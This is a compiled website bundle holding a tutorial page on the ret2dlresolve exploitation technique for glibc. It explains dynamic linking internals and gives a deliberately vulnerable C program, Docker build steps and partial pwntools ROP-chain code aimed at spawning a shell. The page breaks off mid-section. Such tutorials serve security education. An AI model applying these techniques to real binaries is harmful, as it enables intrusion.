"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[6663],{7603:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>d,default:()=>h,frontMatter:()=>l,metadata:()=>i,toc:()=>a});const i=JSON.parse('{"id":"pwn/rop-2.34+/dlrop","title":"dlrop","description":" ","source":"@site/pwn/pwn/rop-2.34+/dlrop.md","sourceDirName":"pwn/rop-2.34+","slug":"/pwn/rop-2.34+/dlrop","permalink":"/pwn/pwn/rop-2.34+/dlrop","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":5,"frontMatter":{"description":" ","sidebar_position":5},"sidebar":"tutorialSidebar","previous":{"title":"Controlling rax","permalink":"/pwn/pwn/rop-2.34+/controlling-rax"},"next":{"title":"Other gadgets","permalink":"/pwn/pwn/rop-2.34+/other-gadgets"}}');var t=s(4848),r=s(8453);const l={description:" ",sidebar_position:5},d="dlrop",o={},a=[{value:"Classic ret2dlresolve",id:"classic-ret2dlresolve",level:2},{value:"Shared libraries",id:"shared-libraries",level:3},{value:"PLT and GOT",id:"plt-and-got",level:3},{value:"puts@plt",id:"putsplt",level:4},{value:"0x1020: dispatcher",id:"0x1020-dispatcher",level:4},{value:"link map",id:"link-map",level:4},{value:"_dl_runtime_resolve_xsavec",id:"_dl_runtime_resolve_xsavec",level:3},{value:"Dynamic section",id:"dynamic-section",level:3},{value:"DT_SYMTAB",id:"dt_symtab",level:4},{value:"DT_STRTAB",id:"dt_strtab",level:4},{value:"DT_JMPREL",id:"dt_jmprel",level:4},{value:"_dl_fixup",id:"_dl_fixup",level:3},{value:"Attack idea",id:"attack-idea",level:3},{value:"Attack demo",id:"attack-demo",level:3},{value:"Arbitrary write",id:"arbitrary-write",level:4},{value:"Contructing objects",id:"contructing-objects",level:4},{value:"Finishing the rop chain",id:"finishing-the-rop-chain",level:4},{value:"Full exploit",id:"full-exploit",level:4},{value:"Function-oriented programming",id:"function-oriented-programming",level:2},{value:"Attack scenario",id:"attack-scenario",level:3},{value:"Arbitrary write",id:"arbitrary-write-1",level:3},{value:"ret2gets payload",id:"ret2gets-payload",level:3},{value:"Exploit script",id:"exploit-script",level:3},{value:"Alternative payloads",id:"alternative-payloads",level:3},{value:"General ret2gets",id:"general-ret2gets",level:4},{value:"ret2rand",id:"ret2rand",level:4},{value:"Arbitrary rop chains",id:"arbitrary-rop-chains",level:2},{value:"Attack scenario",id:"attack-scenario-1",level:3},{value:"Deadend with r_addend",id:"deadend-with-r_addend",level:3},{value:"Faking link maps",id:"faking-link-maps",level:3},{value:"Revisiting _dl_fixup",id:"revisiting-_dl_fixup",level:3},{value:"The tables",id:"the-tables",level:4},{value:"l_ld_readonly",id:"l_ld_readonly",level:4},{value:"st_other",id:"st_other",level:4},{value:"STT_GNU_IFUNC",id:"stt_gnu_ifunc",level:4},{value:"l_reloc_result",id:"l_reloc_result",level:4},{value:"Writing to memory",id:"writing-to-memory",level:3},{value:"Exploit script",id:"exploit-script-1",level:3}];function c(e){const n={a:"a",admonition:"admonition",code:"code",del:"del",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"dlrop",children:"dlrop"})}),"\n",(0,t.jsx)(n.p,{children:"Another ROP classic is the ret2dlresolve, which allows an attacker to call arbitrary functions in libc without needing the base address, which involves abusing the dynamic linker responsible for resolving functions into the GOT at runtime."}),"\n",(0,t.jsxs)(n.p,{children:["You may have seen this used in combination with gadgets (like our beloved ",(0,t.jsx)(n.code,{children:"pop rdi ; ret"}),") from the binary before, however given our current predicament, that simply won't do!"]}),"\n",(0,t.jsx)(n.p,{children:"So here's 2 ways to use ret2dlresolve beyond 2.34."}),"\n",(0,t.jsx)(n.h2,{id:"classic-ret2dlresolve",children:"Classic ret2dlresolve"}),"\n",(0,t.jsx)(n.p,{children:"But first, an introduction to ret2dlresolve, cos why not."}),"\n",(0,t.jsx)(n.h3,{id:"shared-libraries",children:"Shared libraries"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",metastring:'title="hello_world.c"',children:'#include <stdio.h>\n\nint main() {\n    puts("Hello world");\n}\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Let's take the very simple program above and compile it normally: ",(0,t.jsx)(n.code,{children:"gcc hello_world.c -o hello_world"}),". Clearly it will print ",(0,t.jsx)(n.code,{children:"Hello world"})," by calling ",(0,t.jsx)(n.code,{children:"puts"}),", but from this program's perspective, what even is ",(0,t.jsx)(n.code,{children:"puts"}),"? After all, we haven't defined it ourselves. Instead we're calling upon the standard C library (glibc on linux), which has implemented it for us."]}),"\n",(0,t.jsxs)(n.p,{children:["So how does the program use this? One way is compiling the program along with the code for ",(0,t.jsx)(n.code,{children:"puts"})," embedded in it (i.e. static binaries), however this will make programs larger than they perhaps need to be. While it won't make much of a difference here, it can for much larger programs."]}),"\n",(0,t.jsxs)(n.p,{children:["The preferred way is to have a single binary (a shared library) containing all the code for functions in the standard library, then the ",(0,t.jsx)(n.code,{children:"hello_world.c"})," program can borrow the functions it needs, like ",(0,t.jsx)(n.code,{children:"puts"}),", that way there's less duplicated code across every binary."]}),"\n",(0,t.jsxs)(n.p,{children:["For ",(0,t.jsx)(n.code,{children:"puts"}),", and many other functions, this binary will be ",(0,t.jsx)(n.code,{children:"libc.so.6"}),". This will be loaded into ",(0,t.jsx)(n.code,{children:"hello_world"}),"'s memory, so that all its functions are available to the program, not just ",(0,t.jsx)(n.code,{children:"puts"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["So then, how does it know where ",(0,t.jsx)(n.code,{children:"puts"})," is?"]}),"\n",(0,t.jsx)(n.h3,{id:"plt-and-got",children:"PLT and GOT"}),"\n",(0,t.jsx)(n.p,{children:"It does this using the PLT  and the GOT (Global Offset Table)."}),"\n",(0,t.jsxs)(n.p,{children:['The PLT (or Procedure Linkage Table :nerd:) is a "table" of small functions, where each one corresponds to an external function used by the program, such as ',(0,t.jsx)(n.code,{children:"puts"})," in our case. Instead of calling ",(0,t.jsx)(n.code,{children:"puts"})," directly, it will instead call its corresponding entry, named ",(0,t.jsx)(n.code,{children:"puts@plt"}),", which will then redirect to ",(0,t.jsx)(n.code,{children:"puts"})," itself. It does this by resolving (i.e. finding) the function, then jumping to it."]}),"\n",(0,t.jsx)(n.p,{children:"The GOT (or Global Offset Table :nerd::nerd:) is used alongside the PLT, as a sort of cache. Once a function has been resolved, it doesn't need to resolve it every time, because that would be expensive, so the address of the function is stored in the GOT, for quick access on the next call."}),"\n",(0,t.jsx)(n.h4,{id:"putsplt",children:"puts@plt"}),"\n",(0,t.jsx)(n.p,{children:"Let's see how this is handled:"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (1).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Calling puts@plt"})})]}),"\n",(0,t.jsxs)(n.p,{children:["Disassembling main, we find it calls ",(0,t.jsx)(n.code,{children:"puts@plt"}),": the PLT entry for ",(0,t.jsx)(n.code,{children:"puts"}),"."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (2).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"puts@plt"})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (3).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)(n.a,{href:"mailto:puts@got.plt",children:"puts@got.plt"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["It will first jump to an address stored in ",(0,t.jsx)(n.code,{children:"puts@got.plt"}),", which is ",(0,t.jsx)(n.code,{children:"puts"}),"'s corresponding GOT entry. Since ",(0,t.jsx)(n.code,{children:"puts"})," hasn't been called (and thus resolved) yet, this will initially contain the next instruction in ",(0,t.jsx)(n.code,{children:"puts@plt"})," (",(0,t.jsx)(n.code,{children:"0x1036"}),"), so that it continues with ",(0,t.jsx)(n.code,{children:"puts@plt"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["This then pushes ",(0,t.jsx)(n.code,{children:"0"}),', which is the "unique index" for this function (we\'ll come back to this in a moment), and jumps to 0x1020.']}),"\n",(0,t.jsx)(n.h4,{id:"0x1020-dispatcher",children:"0x1020: dispatcher"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (4).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"0x1020: Dispatcher gadget"})})]}),"\n",(0,t.jsxs)(n.p,{children:["This gadget will then do 2 things: push the binary's ",(0,t.jsx)(n.strong,{children:"link map"})," (stored at ",(0,t.jsx)(n.code,{children:"0x3ff0"}),") and jump to ",(0,t.jsx)(n.code,{children:"_dl_runtime_resolve_xsavec"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (5).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"_dl_runtime_resolve_xsavec"})})]}),"\n",(0,t.jsx)(n.h4,{id:"link-map",children:"link map"}),"\n",(0,t.jsxs)(n.p,{children:["A ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/include/link.h#L95",children:"link map"})," is an object which stores information about a loaded object, such as shared libraries like ",(0,t.jsx)(n.code,{children:"libc.so.6"}),", or the current program. Each has a link map, and they're linked together. These store information such as the base address, the name of the object, where the symbols are etc. This is where all the magic happens, as it contains all the information necessary to resolve a function, like ",(0,t.jsx)(n.code,{children:"puts"}),". Using the program's link map, it can find the object (i.e. library) containing the desired function, and find the address of the function within it."]}),"\n",(0,t.jsx)(n.h3,{id:"_dl_runtime_resolve_xsavec",children:"_dl_runtime_resolve_xsavec"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-trampoline.h#L60",children:"_dl_runtime_resolve_xsavec"}),' is a function that takes the 2 (stack) arguments we saw before: link map and "unique index", and aims to use these to find the function and call it, with the arguments provided earlier (i.e. the string ',(0,t.jsx)(n.code,{children:"Hello world"}),")."]}),"\n",(0,t.jsx)(n.p,{children:"The function may look intimidating, but all it does is:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Save the current state, including the 6 register arguments to the stack."}),"\n",(0,t.jsxs)(n.li,{children:["Call ",(0,t.jsx)(n.code,{children:"_dl_fixup"})," to resolve the function (storing it in ",(0,t.jsx)(n.code,{children:"r11"}),"), using the link map and index (this will clobber the registers, hence the saving/restoring)."]}),"\n",(0,t.jsx)(n.li,{children:"Restore the state, including the 6 arguments into the registers."}),"\n",(0,t.jsxs)(n.li,{children:["Jump to the function in ",(0,t.jsx)(n.code,{children:"r11"}),"."]}),"\n"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/_dl_runtime_resolve_xsavec.png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.p,{children:["So now, how does ",(0,t.jsx)(n.code,{children:"_dl_fixup"})," work?"]}),"\n",(0,t.jsx)(n.p,{children:"Before we get into that, we first need to cover some details about the ELF's dynamic section."}),"\n",(0,t.jsx)(n.h3,{id:"dynamic-section",children:"Dynamic section"}),"\n",(0,t.jsx)(n.p,{children:"The dynamic section stores a list of key-value pairs, storing information relevant to the dynamic linking process we're interested in, such as needed libraries, symbol tables, string tables etc."}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (15).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["Dynamic section of ",(0,t.jsx)("code",{children:"hello_world"})]})})]}),"\n",(0,t.jsx)(n.p,{children:"From the above, we're particularly interested in the following three."}),"\n",(0,t.jsx)(n.h4,{id:"dt_symtab",children:"DT_SYMTAB"}),"\n",(0,t.jsxs)(n.p,{children:["This is the ",(0,t.jsx)(n.em,{children:"dynamic"})," symbol table, i.e. the ",(0,t.jsx)(n.code,{children:".dynsym"})," section (not to be confused with ",(0,t.jsx)(n.code,{children:".symtab"}),"). This stores an array of ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L535",children:"Elf64_Sym"})," objects:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"typedef struct\n{\n  Elf64_Word\tst_name;\t\t/* Symbol name (string tbl index) */\n  unsigned char\tst_info;\t\t/* Symbol type and binding */\n  unsigned char st_other;\t\t/* Symbol visibility */\n  Elf64_Section\tst_shndx;\t\t/* Section index */\n  Elf64_Addr\tst_value;\t\t/* Symbol value */\n  Elf64_Xword\tst_size;\t\t/* Symbol size */\n} Elf64_Sym;\n"})}),"\n",(0,t.jsxs)(n.p,{children:["While ",(0,t.jsx)(n.code,{children:".symtab"})," stores the symbols in the program itself, ",(0,t.jsx)(n.code,{children:".dynsym"})," stores information about ",(0,t.jsx)(n.em,{children:"external"})," symbols, such as ",(0,t.jsx)(n.code,{children:"puts"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (16).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:".dynsym"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["Unlike in ",(0,t.jsx)(n.code,{children:".symtab"}),", ",(0,t.jsx)(n.code,{children:"st_value"})," won't (usually) contain a value (as it doesn't know where it is), so the most significant field to keep in mind is ",(0,t.jsx)(n.code,{children:"st_name"}),", which points to the string for the name using an offset into the string table."]}),"\n",(0,t.jsx)(n.h4,{id:"dt_strtab",children:"DT_STRTAB"}),"\n",(0,t.jsxs)(n.p,{children:["This is simply a list of null-terminated strings, specifcally the one for ",(0,t.jsx)(n.em,{children:"dynamic"})," symbols (i.e. ",(0,t.jsx)(n.code,{children:".dynstr"})," not ",(0,t.jsx)(n.code,{children:".strtab"}),"). Symbols in ",(0,t.jsx)(n.code,{children:".dynsym"})," reference a string here using an offset."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (17).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:".dynstr"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["So for example, the ",(0,t.jsx)(n.code,{children:"puts"})," symbol would have ",(0,t.jsx)(n.code,{children:"st_name=1"}),"."]}),"\n",(0,t.jsx)(n.h4,{id:"dt_jmprel",children:"DT_JMPREL"}),"\n",(0,t.jsxs)(n.p,{children:["This is the relocation table for external functions (i.e. ",(0,t.jsx)(n.code,{children:".rela.plt"}),"), and is the most important section for resolving symbols. This stores a list of ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L663",children:"Elf64_Rela"})," objects:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"typedef struct\n{\n  Elf64_Addr\tr_offset;\t\t/* Address */\n  Elf64_Xword\tr_info;\t\t\t/* Relocation type and symbol index */\n  Elf64_Sxword\tr_addend;\t\t/* Addend */\n} Elf64_Rela;\n"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"r_offset"})," stores where the GOT entry is located (i.e. where the function address should be written to when it's resolved)."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"r_info"})," stores both which symbol this entry refers to (an index into ",(0,t.jsx)(n.code,{children:".dynsym"}),") and what type of relocation it is. For our purposes, we'll look at resolving functions, so the type will be ",(0,t.jsx)(n.code,{children:"R_X86_64_JUMP_SLOT"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"r_addend"})," isn't used, so we can usually ignore it. However what it ",(0,t.jsx)(n.em,{children:"would"})," do is add an offset onto the end of the function address."]}),"\n"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (21).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:".rela.plt"})})})]}),"\n",(0,t.jsx)(n.h3,{id:"_dl_fixup",children:"_dl_fixup"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L41",children:"_dl_fixup"})," will do 2 things:"]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Resolve the function and return its address."}),"\n",(0,t.jsx)(n.li,{children:"Write that address to its corresponding GOT entry."}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"This function is quite complex, so we won't cover all of it: just what's needed for us."}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/Screenshot 2025-06-18 003723.png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"_dl_fixup"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["It takes 2 arguments: the link map, and that unique symbol index I mentioned earlier. ",(0,t.jsx)(n.code,{children:"_dl_fixup"})," calls it the ",(0,t.jsx)(n.code,{children:"reloc_arg"}),", and that's because it's used as an index into the relocation table (",(0,t.jsx)(n.code,{children:"DT_JMPREL"}),") to get the ",(0,t.jsx)(n.code,{children:"reloc"})," object."]}),"\n",(0,t.jsxs)(n.p,{children:["By getting the ",(0,t.jsx)(n.code,{children:"reloc->r_info"}),", you can find the corresponding symbol (",(0,t.jsx)(n.code,{children:"sym"}),") in ",(0,t.jsx)(n.code,{children:"DT_SYMTAB"}),", and with ",(0,t.jsx)(n.code,{children:"reloc->r_offset"})," you can find the address of GOT (",(0,t.jsx)(n.code,{children:"rel_addr"}),")."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (237).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Check visibility"})})]}),"\n",(0,t.jsxs)(n.p,{children:["Then it checks the ",(0,t.jsx)(n.a,{href:"https://docs.oracle.com/cd/E19683-01/816-1386/6m7qcoblj/index.html#chapter7-27",children:"visibility"})," of the symbol, which determines how and where symbols are accessible from. We don't need to worry about this for now, as most symbols have ",(0,t.jsx)(n.code,{children:"STV_DEFAULT=0"}),", and so will pass this check. There's also some shenanigans with the version, which we don't really care about."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (238).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Lookup symbol"})})]}),"\n",(0,t.jsxs)(n.p,{children:["Then it does the actual lookup using ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L835",children:"_dl_lookup_symbol_x"}),", offsetting into strtab to get the name as mentioned earlier: ",(0,t.jsx)(n.code,{children:"strtab + sym->st_name"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"The details of the actual lookup isn't too important to us, but to summarise it:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["It ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L859",children:"iterates through each link map"})," in ",(0,t.jsx)(n.code,{children:"l"}),"'s scope (",(0,t.jsx)(n.code,{children:"l->l_scope"}),")."]}),"\n",(0,t.jsxs)(n.li,{children:["For each link map, ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L408",children:"lookup the symbol name in a hash table"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:["For each hit, verify it's the correct symbol using ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L59",children:"check_match"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:["If it is, write the symbol to ",(0,t.jsx)(n.code,{children:"&sym"})," (this would be from the object's ",(0,t.jsx)(n.code,{children:".symtab"}),", so it would contain the offset in ",(0,t.jsx)(n.code,{children:"st_value"}),") and return the corresponding link map in ",(0,t.jsx)(n.code,{children:"result"}),"."]}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Then it ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L99",children:"rebases the symbol"})," using ",(0,t.jsx)(n.code,{children:"result"})," to get the address of the function in ",(0,t.jsx)(n.code,{children:"value"})," (i.e. adds ",(0,t.jsx)(n.code,{children:"l->l_addr"})," onto ",(0,t.jsx)(n.code,{children:"st_value"}),")."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (239).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L158",children:"Return value"})})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (240).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-machine.h#L224",children:"Write value to GOT entry"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["Skipping forward to the end, we finally return ",(0,t.jsx)(n.code,{children:"value"})," and write it into the GOT entry (",(0,t.jsx)(n.code,{children:"rel_addr"}),")."]}),"\n",(0,t.jsx)(n.h3,{id:"attack-idea",children:"Attack idea"}),"\n",(0,t.jsxs)(n.p,{children:["Now that we have an idea of how the resolving process works, let's go back to the dispatcher: ",(0,t.jsx)(n.code,{children:"0x1020"}),". This is the gadget that kickstarts the whole thing, and we can consider it like a function which takes one argument on the stack: ",(0,t.jsx)(n.code,{children:"reloc_arg"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["Each PLT function is just a wrapper which provide a unique ",(0,t.jsx)(n.code,{children:"reloc_arg"}),", so by changing ",(0,t.jsx)(n.code,{children:"reloc_arg"}),", we can decide which function in the PLT we want to call:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"flat(\n    ...\n    0x1020,\n    reloc_arg,\n    return_address,\n    ...\n)\n"})}),"\n",(0,t.jsxs)(n.p,{children:["This allows us to call ",(0,t.jsx)(n.code,{children:"_dl_fixup"})," with an arbitrary ",(0,t.jsx)(n.code,{children:"reloc_arg"}),", and thinking back to ",(0,t.jsx)(n.code,{children:"_dl_fixup"}),", we can notice that there's no bounds check on ",(0,t.jsx)(n.code,{children:"reloc_arg"}),"! This means that if we place our own ",(0,t.jsx)(n.code,{children:"Elf64_Rela"})," object in memory (relative to ",(0,t.jsx)(n.code,{children:"DT_JMPREL"}),"), then we could reference it, thus potentially forcing ",(0,t.jsx)(n.code,{children:"_dl_fixup"})," to resolve an arbitrary symbol, such as ",(0,t.jsx)(n.code,{children:"system"}),"!"]}),"\n",(0,t.jsx)(n.h3,{id:"attack-demo",children:"Attack demo"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",metastring:'title="vuln.c"',children:"#include <unistd.h>\n\nint main() {\n    char buf[0x80];\n    read(0, buf, 0x200);\n}\n"})}),"\n",(0,t.jsxs)(n.p,{children:["For this demo, the above program is compiled with glibc 2.31 (so we still have ",(0,t.jsx)(n.code,{children:"pop rdi ; ret"})," :)):"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (8).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (9).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.admonition,{type:"info",children:[(0,t.jsxs)(n.p,{children:["To compile for an older libc, we can use dockerfile to get an older version of ",(0,t.jsx)(n.code,{children:"gcc"}),":"]}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-docker",metastring:'title="Dockerfile"',children:"FROM ubuntu:20.04\n\nRUN apt-get update && apt-get install -y gcc\n\nWORKDIR /mnt\nENTRYPOINT gcc vuln.c -o vuln -no-pie -fno-stack-protector\n"})}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",metastring:'title="build_docker.sh"',children:"#!/bin/bash\ndocker build -t ubuntu_20 .\ndocker run -v $PWD/:/mnt/ -it ubuntu_20\n"})}),(0,t.jsxs)(n.p,{children:["To get the libc and ld, we can use libc-database, or just copy them from the docker into the shared folder ",(0,t.jsx)(n.code,{children:"/mnt/"}),":"]}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"cp /usr/lib/x86_64-linux-gnu/libc-2.31.so /mnt/\ncp /usr/lib/x86_64-linux-gnu/ld-2.31.so /mnt/\n"})}),(0,t.jsx)(n.p,{children:"TODO: Add alternative for compiling with old libc"})]}),"\n",(0,t.jsxs)(n.p,{children:["For this exploit, we'll use ret2dlresolve to resolve ",(0,t.jsx)(n.code,{children:"system"})," to call ",(0,t.jsx)(n.code,{children:'system("/bin/sh")'}),"."]}),"\n",(0,t.jsx)(n.h4,{id:"arbitrary-write",children:"Arbitrary write"}),"\n",(0,t.jsxs)(n.p,{children:["We have the obvious overflow, but can we do with it? There's no functions for printing data back to us, so we can't get a libc leak. We only have one function as well: ",(0,t.jsx)(n.code,{children:"read"}),", so let's consider what we can do with it."]}),"\n",(0,t.jsxs)(n.p,{children:["We can see that after the ",(0,t.jsx)(n.code,{children:"read"})," call, the arguments are preserved:"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (23).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["Before ",(0,t.jsx)("code",{children:"read"})]})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (24).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["After ",(0,t.jsx)("code",{children:"read"})]})})]}),"\n",(0,t.jsxs)(n.p,{children:["Which happens because the ",(0,t.jsx)(n.code,{children:"read"}),' function is a just a "thin" wrapper around the ',(0,t.jsx)(n.code,{children:"read"})," syscall, so there's no need to move these arguments around."]}),"\n",(0,t.jsxs)(n.p,{children:["This is convenient for us, as controlling ",(0,t.jsx)(n.code,{children:"rdx"})," is more of a hassle than ",(0,t.jsx)(n.code,{children:"rdi"})," and ",(0,t.jsx)(n.code,{children:"rsi"})," (however it can be done with ",(0,t.jsx)(n.code,{children:"ret2csu"}),"), so we can just use the existing ",(0,t.jsx)(n.code,{children:"size=0x200"})," argument (and ",(0,t.jsx)(n.code,{children:"fd=0"}),"), while changing ",(0,t.jsx)(n.code,{children:"rsi"})," to point wherever we want, thus granting arbitrary write."]}),"\n",(0,t.jsxs)(n.p,{children:["For ret2dlresolve, we'll write ",(0,t.jsx)(n.code,{children:"Elf64_Rela"})," and other necessary objects into the binary's memory to prepare to resolve arbitrary functions, so let's write the rop chain first to do this:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'pop_rdi = 0x4011c3\npop_rsi_r15 = 0x4011c1\ndispatcher = 0x401020\n\nwritable = ...    # address to writable "scratch" memory\n\nrop  = b"A" * 0x80\nrop += p64(0)   # saved rbp\nrop += p64(pop_rsi_r15) + p64(writable) + p64(0)\nrop += p64(e.sym.read)\n'})}),"\n",(0,t.jsx)(n.p,{children:"Now for the ret2dlresolve objects!"}),"\n",(0,t.jsx)(n.h4,{id:"contructing-objects",children:"Contructing objects"}),"\n",(0,t.jsxs)(n.p,{children:["On this 2nd ",(0,t.jsx)(n.code,{children:"read"}),", we'll send a blob containing all of the objects we need to resolve a symbol, which for us will be ",(0,t.jsx)(n.code,{children:"system"})," (however it works the same for any symbol!)."]}),"\n",(0,t.jsx)(n.p,{children:"To recap, these objects will be:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"Elf64_Rela"})," (relocation table entry)."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"Elf64_Sym"})," (symbol table entry)."]}),"\n",(0,t.jsxs)(n.li,{children:["Name of symbol: ",(0,t.jsx)(n.code,{children:'"system\\x00"'}),"."]}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["Organising these objects need to go can be fiddly, as there's multiple considerations, such as objects will reference other ones: ",(0,t.jsx)(n.code,{children:"Rela -> Sym -> Name"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["Another is alignment, since the symbol table and relocation table are indexed from their corresponding starting addresses, and each entry is size ",(0,t.jsx)(n.code,{children:"0x18"}),", we'll need to line up our objects properly."]}),"\n",(0,t.jsxs)(n.p,{children:["We can find the addresses of these with ",(0,t.jsx)(n.code,{children:"readelf -Wd ./vuln"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/Screenshot 2025-07-12 220401.png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.admonition,{type:"info",children:[(0,t.jsx)(n.p,{children:"Another way using pwntools 